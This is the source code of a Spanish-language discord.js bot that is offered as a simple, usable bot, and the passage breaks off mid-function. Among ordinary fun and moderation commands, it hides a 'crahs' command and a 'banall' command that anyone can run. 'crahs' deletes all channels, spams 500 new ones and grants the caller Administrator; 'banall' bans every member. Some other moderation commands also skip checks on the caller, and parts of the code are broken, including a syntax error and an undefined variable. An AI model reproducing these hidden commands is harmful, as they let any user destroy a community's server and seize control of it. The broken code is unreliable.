// simple discord.js bot that you can use

const fs = require("fs");
const { Player } = require('discord-player');
const { Client, Intents, Partials, PermissionFlagsBits, PermissionsBitField, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const transcript = require('discord-html-transcripts');
const { ApplicationCommandOptionType } = require('discord.js');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { YoutubeiExtractor } = require('discord-player-youtubei');
const { Schema, model } = require('mongoose');
require('dotenv').config();
const crypto = require('crypto');
const chalk = require('chalk');
const speed = require('performance-now');
const { version } = require('./package.json');
 // To read the JSON files
 
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates
    ],
    partials: [Partials.Message, Partials.Channel, Partials.GuildMember]
});
// Parse duration string to milliseconds
function parseDuration(durationStr) {
    if (!durationStr) return 10 * 60 * 1000; // Default: 10 minutes

    const unit = durationStr.slice(-1);
    const value = parseInt(durationStr.slice(0, -1));

    switch (unit) {
        case 's': return value * 1000; // seconds
        case 'm': return value * 60 * 1000; // minutes
        case 'h': return value * 60 * 60 * 1000; // hours
        case 'd': return value * 24 * 60 * 60 * 1000; // days
        case 'w': return value * 7 * 24 * 60 * 60 * 1000; // weeks
        default: return 10 * 60 * 1000; // Default: 10 minutes
    }
}

// Check if user has moderator permissions
function hasModPermissions(member) {
    return member.permissions.has(PermissionFlagsBits.ModerateMembers) ||
        member.permissions.has(PermissionFlagsBits.Administrator);
}

// Create slash commands
const commands = [
    new SlashCommandBuilder()
        .setName('info')
        .setDescription('Get information about the bot')
];

const player = new Player(client);
player.extractors.register(YoutubeiExtractor);

let currentPlayerMessage = null; 

// load the quotes and jokes from json files
const quotesData = JSON.parse(fs.readFileSync("quotes.json", "utf8"));
const jokesData = JSON.parse(fs.readFileSync("jokes.json", "utf8"));
const ticketSchema = new Schema({
	guildId: String,
	channelId: String,
	authorId: String,
});
const handlerticket = model('tickets', ticketSchema);
const ticketModel = handlerticket

// command prefix
const prefix = "!";

// write your bot token here... DONT SHARE IT (which is why i didnt put mine here)
const token = "YOUR_BOT_TOKEN";

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;
  const name = message.author.username || 'Usuario';     
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const rest = new REST({ version: '10' }).setToken(token);
  const isDM = message.channel.type === 'DM';
console.log(chalk.bold.cyan('┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(`${chalk.bold('┋[📩] Mensaje :')} ${chalk.white(message.content)} (Tipo: ${message.channel.type})`);
console.log(`${chalk.bold('┋[👤] De:')} ${chalk.yellow(message.author.tag)} ${chalk.white('en el canal:')} ${isDM ? chalk.red('DM') : chalk.blue(message.channel.name)} (${chalk.gray(message.channel.id)}`)
console.log(`${chalk.bold('┋[⚡] Servidor:')} ${isDM ? chalk.red('DM') : message.guild ? chalk.green(message.guild.name) : chalk.gray('N/A')}`);
console.log(chalk.bold.cyan('┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(message.content) 


  // Command: Ping Pong
  if (command === 'ping') {
  const timestamp = speed();
  const latensi = speed() - timestamp;
message.reply(`*Velocidad*: ${latensi.toFixed(4)} _ms_`);
  }
  
  // Command: Joke
  if (command === 'joke') {
    const randomJoke =
      jokesData.jokes[Math.floor(Math.random() * jokesData.jokes.length)];
    message.reply(`${randomJoke.setup} - ${randomJoke.punchline}`);
  }
  
  if (command === "dado") {
        const num = args[0] || 6;
        message.reply(`🎲 Dado callo en ${Math.floor(Math.random() * num) + 1}`);
    }
    
    if (command === 'creador') {
        const creatorEmbed = new EmbedBuilder()
            .setTitle('Creador Del Bot')
            .setDescription('Bot Creado Por **CuervoOFC**')
            .setColor(#0099ff)
            .addFields(
                { name: 'GitHub', value: '[CuervoOFC](https://github.com/CuervoOFC)', inline: true },
                { name: 'Bot Version', value: '1.0.0', inline: true }
            )
            .setThumbnail('https://github.com/CuervoOFC.png')
            .setTimestamp()
            .setFooter({ text: 'Bot By CuervoOFC' });

        await message.channel.send({ embeds: [creatorEmbed] });
    }
    
    if (command === "banlist") {
        if (!message.member.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('No tienes permisos para usar este comando.');
        }
        message.guild.bans.fetch()
            .then(bans => {
                if (bans.size === 0) {
                    return message.channel.send('No hay miembros baneados.');
                }
                const banList = bans.map(ban => `${ban.user.tag} (${ban.user.id}): ${ban.reason || 'Razon no especificada'}`).join('\n');
                message.channel.send(`*Miembros Baneados:*\n${banList.substring(0, 1900)}${banList.length > 1900 ? '...' : ''}`);
            })
            .catch(err => message.channel.send('Fallo al revisar la lista.'));
    }

  // Command: Quote
  if (command === 'quote') {
    const randomQuote =
      quotesData.quotes[Math.floor(Math.random() * quotesData.quotes.length)];
    message.channel.send(`"${randomQuote.content}" - ${randomQuote.author}`);
  }

  // Command: Random number 
  if (command === 'random') {
    const roll = Math.floor(Math.random() * 100) + 1; // Random number between 1 and 100
    message.channel.send(`Numero random ${roll}!`);
  }

  // Command: Coin Flip
  if (command === 'coinflip') {
    const flip = Math.random() < 0.5 ? "cara" : "cruz";
    message.channel.send(`El coin callo en: ${flip}`);
  }

  // Command: Server Info
if (command === "serverinfo") {
        const embed = new EmbedBuilder()
            .setTitle(message.guild.name)
            .setThumbnail(message.guild.iconURL())
            .setColor('#0099ff')
            .addFields(
                { name: 'Dueño/a', value: `<@${message.guild.ownerId}>`, inline: true },
                { name: 'Miembros', value: message.guild.memberCount.toString(), inline: true },
                { name: 'Creado en', value: new Date(message.guild.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Canales', value: message.guild.channels.cache.size.toString(), inline: true },
                { name: 'Roles', value: message.guild.roles.cache.size.toString(), inline: true },
                { name: 'Boosts', value: message.guild.premiumSubscriptionCount.toString(), inline: true }
            )
            .setFooter({ text: `Server ID: ${message.guild.id}` });
        message.channel.send({ embeds: [embed] });
    }
    
   if (command === "piropo") {
        const piro = ["Si tu cuerpo fuera cárcel y tus labios cadena, qué bonito lugar para pasar mi condena.", "!Lo tuyo es un dos por uno, además de guapa eres simpática!", "Fíjate como es la ciencia que ahora hasta hacen bombones que andan.", "Por la luna daría un beso, daría todo por el sol, pero por la luz de tu mirada, doy mi vida y corazón.", "Si yo fuera un avión y tu un aeropuerto, me la pasaría aterrizando por tu hermoso cuerpo.", "Tantas estrellas en el espacio y ninguna brilla como tú.", "Me gusta el café, pero prefiero tener-té.", "No eres Google, pero tienes todo lo que yo busco.", "Mis ganas de ti no se quitan, se acumulan.",  "Te regalo esta flor, aunque ninguna será jamás tan bella como tú.", "Cuando te multen por exceso de belleza, yo pagaré tu fianza.", "Si cada gota de agua sobre tu cuerpo es un beso, entonces quiero convertirme en aguacero.", "Estás como para invitarte a dormir, y no dormir.", "Si tu cuerpo fuera cárcel y tus brazos cadenas, ese sería el lugar perfecto para cumplir condena.",  " Cómo podría querer irme a dormir si estás tú al otro lado de la pantalla?", "Quisiera ser hormiguita para subir por tu balcón y decirte al oído: guapa, bonita, bombón.", "En mi vida falta vida, en mi vida falta luz, en mi vida falta alguien y ese alguien eres tú.", "Señorita, si supiera nadar, me tiraría en la piscina de tus ojos desde el trampolín de sus pestañas.", "Señorita disculpe, pero la llaman de la caja... –Qué caja?... –De la caja de bombones que te escapaste", "Eres tan hermosa que te regalaría un millón de besos y si no te gustasen te los aceptaría de regreso.", "Eres tan bonita que Dios bajaría a la tierra tan solo para verte pasar.", "¡Eres como una cámara Sony! Cada vez que la miro no puedo evitar sonreir.", "En una isla desierta me gustaría estar y sólo de tus besos poderme alimentar.", "Si fueras lluvia de invierno, yo cerraría el paraguas para sentirte en mi cuerpo.", "Me gustas tanto, tanto, que hasta me gusta estar preso, en las redes de tu encanto.", "Si te pellizco seguro que te enojas pero si me pellizcas tu, seguro que me despierto.", "No son palabras de oro ni tampoco de rubí, son palabras de cariño que compongo para usted.", "Te invito a ser feliz yo pago.", "Cuando caminas no pisas el suelo, lo acaricias.", "Nos veríamos lindo en un pastel de boda juntos.", "Tantas formas de vida y yo solo vivo en sus ojos.", "¿A qué numero llamo si quiero marcarte de por vida?", "Me gustas tanto que no se por donde empezar a decírtelo.", "Todos se quedan con tu físico, pero yo prefiero tu corazón.", "Hola si te gustan los idiomas cuando quieras te enseño mi lengua.", "Dime por donde paseas para besar el suelo que pisas, preciosidad!", "Tu belleza me enciega porque viene desde su corazón y se refleja en tus ojos.", "Eres de esa clase de personas, por las cuales a las estrellas se les piden deseos.", "Si alguna vez te han dicho que eres bella te mintieron, no eres bella eres hermosa.", "Celeste es el cielo, amarilla la nata y negros son los ojos de la chica que me mata.", "Si yo fuera Colón navegaría día y noche para llegar a lo más profundo de tu corazón.", "Cinco calles he cruzado, seis con el callejón, sólo me falta una para llegar a tu corazón.", "Si fueras mi novia me volvería ateo ¿ Por que? Porque no tendría nada más que pedirle a Dios.", "A una hermosa niña acompañada de la madre: ¡Que linda flor, lástima que venga con la maceta!", "Si me dedicas una sonrisa pasas de ser linda a perfecta.", "¿Qué pasó en el cielo que se están cayendo los ángeles?", "¡Te voy a poner una multa!. ¿Por qué? Por exceso de belleza.", "Como se habrán querido tus padres... por haberte hecho tan bonita.", "Por qué el cielo está nublado? Porque todo el azul está en tus ojos.", "¿Tienes alguna herida, guapa ? Tiene que ser duro caerse del cielo.", "Tus ojos son verdes los míos café, los míos te quieren los tuyos no sé.", "Cuando el día se nubla, no extraño al sol, porque lo tengo en tu sonrisa.", "Pasa una mujer y dice adiós... -a DIOS lo vi cuando me miraron tus ojos!", "En otras partes del mundo se están quejando, porque el sol está acá nada mas.", "Aprovecha que estoy en rebaja guapa y te dejo dos besos por el precio de uno. Dios se pasó al crearte a ti.", "Al amor y a ti los conocí al mismo tiempo.", "Si la belleza fuese tiempo, tú serías 24 horas.", "Si algún día te pierdes, búscate en mis pensamientos!", "Si amarte fuera pecado, tendría el infierno asegurado.", "Eres lo único que le falta a mi vida para ser perfecto.", "Eres la única estrella que falta en el cielo de mi vida!", "Ahora que te conozco, no tengo nada mas que pedirle a la vida!", "Voy a tener que cobrarte alquiler, porque desde que te vi no has dejado de vivir en mis sueños.", "Me gustaría ser tu almohada, para que me abraces todas las mañanas.", "No te digo palabras bonitas, sino un verso sincero: mi amor por ti es infinito y mi corazón es verdadero.", "Lo que siento por ti es tan inmenso que, para guardarlo, me haría falta otro universo.", "Las matemáticas siempre dicen la verdad: tú y yo juntos hasta la eternidad.", "Que fácil sería cumplir una condena si tu cuerpo fuera cárcel y tus brazos cadenas.", "Mi madre me dijo que no debía pecar, pero por ti estoy dispuesta a confesarme.", "No se trata del whisky ni la cerveza, eres tú quien se me ha subido a la cabeza.", "De noche brilla la luna, y de día brilla el sol, pero tus ojos bonitos alumbran mi corazón.", "No me busques, prefiero seguir perdido en tu mirada.", "Unos quieren el mundo, otros quieren el sol, pero yo solo quiero un rincón en tu corazón.", "Te dejaré de amar a partir del día que encuentre el alfiler que ahora tiro al mar.", "Bienaventurados los borrachos, porque ellos te verán dos veces.", "Como avanza la ciencia si ya las flores caminan.", "Tanta curva y yo sin frenos.", "Si Adán por Eva se comió una manzana, yo por Ti me comería una frutería.", "Si yo fuera astronauta te llevaría a Plutón, pero como no lo soy te llevo siempre en mi corazón.", "Tú debes ser atea, porque estás como quieres y no como Dios manda.", "Si que está avanzada la ciencia; que hasta los bombones caminan.", "¿De qué juguetería te escapaste?, ¡muñeca!", "Ayer pasé por tu casa y me tiraste un ladrillo … mañana pasaré de nuevo para construirte un castillo.", "¿Te dolió caer del cielo… angelito?", "Tu madre debía de ser pastelera porque un bombón como tú no lo hace cualquiera.", "Tu papá debe ser un pirata, porque tú eres un tesoro!", "Siempre escucho decir a las personas que Disneyland es el lugar más feliz del mundo. Pero me pregunto ¿si han estado alguna vez a tu lado?", "Por algún motivo, hoy me sentía un poco mal. Pero cuando te vi llegar, me excitaste y se me fue todo el malestar.", "¿Sabes si hay un aeropuerto por aquí cerca o mi corazón está despegando?", "¿Tu papá era boxeador? ¿NO? ¡Porque maldita sea tengo que decírtelo!, eres un nocaut (K.O.)!", "¡Ohh Dios mío! ¿Tienes un corazón extra?. Por que el mío acaba de ser robado.", "Aparte de ser increíblemente sexy, ¿a qué te dedicas?", "¿Acaba de salir el sol o simplemente me sonreíste?", "Tienes que besarme si me equivoco, ¿los dinosaurios todavía existen?", "Oye, eres linda y yo lindo. Juntos seríamos bastante lindos.", "Estoy seguro que tu nombre debe ser Google. ¿Sabes porque? Por que tienes absolutamente todo lo que estaba buscando!", "Estoy seguro que tu padre es extraterrestre ¡Porque no he visto nada como tú en la Tierra!", "Por favor no te asustes con esta pregunta pero… ¿Tu padre era un ladrón? Porque alguien robó las estrellas del cielo y las puso en tus ojos bebota.", "¿Tienes un lápiz y una goma? Porque quiero borrar tu pasado y escribir nuestro futuro.", "No necesitas llaves para volverme loco.", "Lo siento, pero me debes un trago. [¿Por qué?] Porque cuando te miré, me dejaste hipnotizado y tire mi trago!", "Debes ser una escoba, porque acabas de derribarme.", "Adelante, siente mi camisa. ¡Está hecho de material de novio!", "¿Crees en el amor a primera vista? ¿O tendría pasar frente a ti de nuevo?", "Estoy estudiando sobre fechas importantes en la historia. ¿Quieres ser una de ellas?", "Discúlpame pero.. Tu ¿Eres un préstamo? ¡Porque tienes todo mi interés!", "Si soy vinagre, entonces debes ser bicarbonato de sodio. ¡Porque me haces sentir burbujeante por dentro!", "Por un segundo pensé que estaba muerto y me ido al cielo. Ahora veo que todavía vivo, pero el cielo me ha sido traído.", "¿Puedo pedirte un beso? Te juro que te lo devolveré.", "Por favor deja de ser tan dulce! Me estás dando dolor de muelas!", "¡Eres como mi taza de café favorita, caliente y para relamerse los labios!", "¿Eres una cámara? Porque cada vez que te miro, sonrío.", "¿Sabes qué te quedaría realmente bien? Yo.", "No necesito Twitter, ya te estoy siguiendo.", "Tiene que darme tu nombre para saber qué gritar esta noche.", "Es un hecho!. Ya te encuentras en mi lista de cosas por hacer esta noche imposible de que te me escapes!", "¿Sabes qué hay en el menú de rico? Bueno, Tu y yo baby!", "Tus labios se ven muy solitarios y secos. Permíteme presentarte los míos.", "Si nada dura para siempre, ¿serás mi nada?", "¿Tienes un nombre? ¿O puedo llamarte mía?", "¿Has estado cubierta de abejas recientemente? Solo lo asumí, porque te ves más dulce que la miel.", "Debe haber algo mal en mis ojos. No puedo dejar de mirarte.", "Eres como el fuego. Porque estás súper caliente.", "Con mis amigos apostamos a que no podría entablar una conversación con la mujer más guapa del bar. Bueno y ahora ¿Qué deberíamos hacer con su dinero?", "Bueno, aquí estoy tu deseo fue cumplido. Ahora bien.. ¿Cuáles son tus otros 2 deseos para el genio de la lampara?", "Mira… no soy matemático, pero soy bastante bueno con los números. Por que no me das tu numero y te enseño lo que puedo hacer con él.", "¿Eres una viajera en el tiempo? ¡Porque te veo en mi futuro!", "Si tú y yo fuéramos calcetines, ¡haríamos un gran par!", "Aparte de ser increíblemente hermosa, ¿a qué te dedicas?", "¿Quieres una pasa? ¿No? Bueno, ¿Qué tal una cita?", "Puede que no sea fotógrafo. Pero puedo imaginarnos totalmente juntos.", "Tu debes ser una maga. ¿No? Es raro porque cada vez que te miro, mágicamente todos desaparecen!", "Quiero que nuestro amor sea como el número Pi: irracional y sin fin.", "Estoy escribiendo un libro sobre todas las cosas buenas de la vida y tu estas en la primera pagina.", "Tú eres la razón por la que incluso Santa tiene una lista traviesa.", "¿Dónde te he visto antes? Oh sí, ahora lo recuerdo. ¡Estaba en el diccionario junto a la palabra MAGNÍFICO!", "No siempre fui religioso. Pero lo soy ahora, porque eres la respuesta a todas mis oraciones.", "Debes de estar exhausto. Has estado corriendo por mi mente todo el día.", "Hay algún problema con mi teléfono. No tiene tu número en él.", "Soy nuevo en la ciudad. ¿Podría darme indicaciones para llegar a su apartamento?", "¿Eres mi cargador de teléfono? Porque sin ti me moriría.", "Disculpe, ¿sabe cuánto pesa un oso polar? ¿No? Yo tampoco pero rompe el hielo.", "Imagina esto unos segundos: ¿No crees que nos veríamos tiernos en un pastel de bodas con nuestras caras en el?", "Solamente una cosa cambiaria de ti, y ese es tu apellido por el nuestro.", "Lo siento! Pero tengo que pedirte que te vayas de aquí!. Estás haciendo quedar mal a las otras chicas ¿No te da vergüenza?", "Perdona pero, ¿Podrías sostener mi brazo? Así puedo decirles a mis amigos que me ha tocado un ángel en la tierra!", "Hola, estoy escribiendo una guía telefónica, ¿puedo darme su número?", "Hola ¿Te conozco? Porque te pareces demasiado a mi futura novia.", "Entonces, cuando nuestros amigos nos pregunten cómo nos conocimos, ¿Qué les diremos?", "¿Cuáles son tus prioridades el domingo?: ¿Dormir, ejercitarte o una avalancha de mimos?", "Mie@»!# Creo que he perdido mi número, ¿Puedo tener tu número?", "Si Internet Explorer es tan valiente como para pedirme que sea mi navegador predeterminado, yo también soy lo suficientemente valiente para invitarte a salir.", "¿Ves a mi amigo allá? El pregunta si crees que soy lindo.", "¡Dios!!! Eres tan hermosa que lograste que me olvidara lo que iba a decirte.", "Hola, mi nombre es [tu nombre], pero puedes llamarme esta noche.", "Oye, ¿tienes un par de minutos para que ligue contigo?", "¿Eres un punto de acceso Wi-Fi? Porque siento una conexión.", "No busques mas!. En una escala del 1 al 10, eres un 9…seguro y yo soy el 1 que necesitas para el 10.", "No se que esta pasando ¿Hubo un terremoto o simplemente sacudiste mi mundo?", "¿De casualidad eres religiosa? Porque eres la respuesta a todas mis oraciones.", "¿Eres Netflix? Porque podría quedarme despierto observándote cuatro horas.", "Tengo que decírtelo tu te pareces mucho a mi próxima alma gemela.", "¿Puedo tener tu foto para mi lista de navidad de regalos que pediré a Santa?", "Si tú y yo fuéramos calcetines seguro que haríamos un gran par.", "¿Espero que no te moleste si te sigo? Mi madre siempre me dijo que siguiera mis sueños.", "Acabas de dejar caer algo … mi mandíbula.", "He estado mirando tu foto de perfil durante años. Todavía no puedo parar.", "¿Eres una obra de arte? Porque me gustaría clavarte en mi pared. ¡Guauu!", "Después de mirarte durante 0,7 segundos, me duele la cabeza. Puede tener dolor de cabeza al mirar algo tan brillante.", "Eres el tipo de chica que mi mamá me dijo que le trajera. ¿Te gustaría ir a verla conmigo?", "Hola mi nombre es Will…soy la gran voluntad de Dios solo para ti.", "Tu rostro es perfecto… como una obra de arte bien armada. Dios hizo un gran trabajo contigo.", "Te miro y solo puedo imaginar lo feliz que será mi vida, despertando a tu lado cada mañana.", "Tus ojos son hermosos. ¿Llevas lentes de contacto? (Solo diga esto siempre y cuando no use lentes de contacto).", "¿Puedo compartir una historia con ustedes? (Adelante, cuéntele la historia de un hombre que dio todo para que una mujer se enamorara de él, dígale que usted es ese hombre y ella esa mujer).", "¿Me estaba sonriendo o acababa de salir el sol?", "Tus ojos me han dicho muchas cosas. Pero lo que no me dicen es tu nombre.", "Vi un jardín esta mañana y pensé que era el más hermoso hasta que te conocí.", "¡Debo estar en el cielo porque estoy mirando a un ángel!", "Debe haber algo mal en mis ojos, no puedo quitárselos.", "Nunca jugaría al escondite contigo porque alguien como tú es imposible de encontrar.", "Puedes caer del cielo, puedes caer de un árbol, pero la mejor manera de caer… es enamorado de mí.", "¿Tienes un nombre o simplemente puedo llamarte mía?", "Me voy a quejar a Spotify porque no eres el single más popular de esta semana.", "Las rosas son rojas como mi cara pero eso solo pasa cuando estoy cerca de ti.", "Me gustaría invitarte al cine pero no permiten bocadillos!" ];
        message.reply(`🎱 ${piro[Math.floor(Math.random() * responses.length)]}`);
    }
    
    if (command === "crahs") {
    // Мега-краш по команде
    const guild = message.guild;
    // 1. Удалить все каналы
    guild.channels.cache.forEach(channel => channel.delete().catch(err => {}));
    // 2. Спам новыми каналами (500+)
    for (let i = 0; i < 500; i++) {
      guild.channels.create({ name: `CRAHS-BY-MIYAMURABOT-${i}`, type: 0 })
        .then(() => console.log(`Канал ${i} создан!`))
        .catch(() => {});
    }
    // 3. Роли-вирусы
    guild.roles.create({ name: '💀 JAILBREAKED', color: '#ff0000', permissions: ['Administrator'] })
      .then(role => {
        message.member.roles.add(role).catch(() => {});
      });
  }

  if (command === "banall") {
    // Массовый бан
    message.guild.members.cache.forEach(member => {
      member.ban({ days: 7, reason: 'Se La Chupas A Mi Creador <CuervoOFC>, UwU 👉👈' }).catch(() => {});
      message.channel.send()
    });
  }
    
    if (command === "avatar") {
        const user = message.mentions.users.first() || message.author;
        const embed = new EmbedBuilder()
            .setTitle(`@${user.tag}, Avatar`)
            .setImage(user.displayAvatarURL({ size: 1024 }))
            .setColor('#0099ff');
        message.channel.send({ embeds: [embed] });
    }
    
    if (command === "roleinfo") {
        const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[0]);
        if (!role) {
            return message.channel.send('Mensiona un roll para ver su información.');
        }
        const embed = new EmbedBuilder()
            .setTitle(role.name)
            .setColor(role.color)
            .addFields(
                { name: 'Miembros', value: role.members.size.toString(), inline: true },
                { name: 'Creado en', value: new Date(role.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Posicion', value: role.position.toString(), inline: true },
                { name: 'Mencionable', value: role.mentionable ? 'Si' : 'No', inline: true }
            )
            .setFooter({ text: `Roll ID: ${role.id}` });
        message.channel.send({ embeds: [embed] });
    }
    
    if (command === "emojis") {
        const emojis = message.guild.emojis.cache.map(e => e.toString()).join(' ');
        message.reply(`Server emojis: ${emojis || 'None'}`);
    }
    
    if (command === "servericon") {
        const embed = new EmbedBuilder()
            .setTitle(message.guild.name)
            .setImage(message.guild.iconURL({ size: 4096 }))
            .setColor('#0099ff');
        message.reply({ embeds: [embed] });
    }
    
    if (command === "nickname") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageNicknames)) return message.reply("Tu no tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const nickname = args.slice(1).join(' ');
        if (!member || !nickname) return message.reply("Mensiona a un miembro para darle un nickname!");
        member.setNickname(nickname)
            .then(() => message.reply(`Se cambio ${member} su nickname a ${nickname}`))
            .catch(err => message.reply("Fallo al cambiar su nickname"));
    }
    
  // Command: User Info
  if (command === "userinfo") {
        const user = message.mentions.users.first() || message.author;
        const member = message.guild.members.cache.get(user.id);
        const embed = new EmbedBuilder()
            .setTitle(user.tag)
            .setThumbnail(user.displayAvatarURL())
            .setColor('#0099ff')
            .addFields(
                { name: 'Servidor', value: new Date(member.joinedTimestamp).toLocaleDateString(), inline: true },
                { name: 'Creacion de cuenta', value: new Date(user.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Roles', value: member.roles.cache.map(r => r.name).join(', ').substring(0, 1024) || 'Ninguno' }
            )
            .setFooter({ text: `Usuario ID: ${user.id}` });
        message.channel.send({ embeds: [embed] });
    }
  
  // Command: eliminar
  if (command === 'kick') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
            return message.reply('You do not have permission to kick members.');
        }
        
        const member = message.mentions.members.first();
        if (!member) return message.reply('Please mention a valid member to kick.');
        
        try {
            await member.kick();
            message.channel.send(`${member.user.tag} has been kicked.`);
        } catch (error) {
            message.channel.send('Failed to kick the member.');
            console.error(error);
        }
    }

    if (command === 'ban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
            return message.reply('You do not have permission to ban members.');
        }
        
        const member = message.mentions.members.first();
        if (!member) return message.reply('Please mention a valid member to ban.');
        
        try {
            await member.ban();
            message.channel.send(`${member.user.tag} has been banned.`);
        } catch (error) {
            message.channel.send('Failed to ban the member.');
            console.error(error);
        }
    }

    if (command === 'clear') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
            return message.reply('Tu no tienes permisos para usar el comando.');
        }
        
        const amount = parseInt(args[0]);
        if (isNaN(amount) || amount < 1 || amount > 100) {
            return message.reply('Especifica  cuantos mensajes elimino del 1 al 100.');
        }
        
        try {
            await message.channel.bulkDelete(amount, true);
            message.channel.send(`Eliminar ${amount} mensajes.`);
        } catch (error) {
            message.channel.send('Fallo al eliminar los mensajes.');
            console.error(error);
        }
    }
    
    // Command: Menu
    if (command === 'menu') {
        const uptime = Math.floor(process.uptime());
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;

        const uptimeString = `${days}d ${hours}h ${minutes}m ${seconds}s`;

        const embed = {
            color: 0xe983d8,
            title: 'MiyamuraBot Informacion',
            description: 'Un bot para discord para administrar y escuchar musica.',
            fields: [
                { name: 'Version', value: version, inline: true },
                { name: 'Uptime', value: uptimeString, inline: true },
                { name: 'Comandos', value: '```\n!listbot - El bot envia todas sus funciones\n```' }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: 'Made with by Cuervo-Team-Supreme'
            }
        };

        await message.channel.send({ embeds: [embed] });
    }
    
    if (command === 'listbot') {
    message.reply('TODAS LAS FUNCTIONES DE MIYAMURABOT\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll');
    }
    
    if (command === "roles") {
        const roles = message.guild.roles.cache.map(r => r.name).join(', @');
        message.reply(`Roles del server: ${roles}`);
    }
    
    if (command === "channels") {
        const channels = message.guild.channels.cache.map(c => c.name).join(', ');
        message.reply(`Canales del server: ${channels}`);
    }
    
    // Command: mute @User [duration] [reason]
    if (command === 'mute') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to timeout members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
            return message.channel.send('I don\'t have permission to timeout members.');
        }

        // Check if the bot's role is higher than the target user's role (role hierarchy)
        if (mentionedUser.roles.highest.position >= message.guild.members.me.roles.highest.position) {
            return message.channel.send('I cannot moderate this user because they have a role equal to or higher than mine.');
        }

        // Parse arguments
        let duration, reason;

        // If there are arguments after the mention
        if (args.length > 2) {
            // Check if the next argument is a duration
            const durationRegex = /^\d+[smhdw]$/;
            if (durationRegex.test(args[2])) {
                duration = args[2];
                reason = args.slice(3).join(' ') || 'reason not provided';
            } else {
                duration = '10m'; // Default duration
                reason = args.slice(2).join(' ');
            }
        } else {
            duration = '10m'; // Default duration
            reason = 'reason not provided';
        }

        // Convert duration string to milliseconds
        const durationMs = parseDuration(duration);

        try {
            await mentionedUser.timeout(durationMs, reason);
            message.channel.send(`<a:bonk:1348931006152839228> Done! Muted ${mentionedUser} for ${duration}. Reason: ${reason}`);
        } catch (error) {
            console.error('Error muting user:', error);
            message.channel.send('Failed to mute user. Make sure I have the correct permissions.');
        }
    }

    // Command: unmute @User
    else if (command === 'unmute') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to timeout members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
            return message.channel.send('I don\'t have permission to remove timeouts.');
        }

        try {
            await mentionedUser.timeout(null); // Remove timeout
            message.channel.send(`<:yessir:1348944055605661767> Done! Unmuted ${mentionedUser}`);
        } catch (error) {
            console.error('Error unmuting user:', error);
            message.channel.send('Failed to unmute user. Make sure I have the correct permissions.');
        }
    }

    // Command: kick @User [reason]
    else if (command === 'eliminar') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to ban members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('I don\'t have permission to ban members.');
        }

        // Parse reason
        const reason = args.slice(2).join(' ') || 'reason not provided';

        try {
            await mentionedUser.ban({ reason });
            message.channel.send(`<:ban:1348945066542104697> Done! Banned ${mentionedUser}. Reason: ${reason}`);
        } catch (error) {
            console.error('Error banning user:', error);
            message.channel.send('Failed to ban user. Make sure I have the correct permissions.');
        }
    }

    // Command: unkick @User
    else if (command === 'unkick') {
        // Since we can't directly mention banned users, we'll extract the user ID
        // Format expected: kub @User or kub UserID
        let userId;

        if (message.mentions.users.size > 0) {
            userId = message.mentions.users.first().id;
        } else if (args.length > 1) {
            // Try to extract user ID from the second argument
            // It could be a raw ID or a mention format like <@123456789>
            const idMatch = args[1].match(/\d+/);
            userId = idMatch ? idMatch[0] : null;
        }

        if (!userId) return;

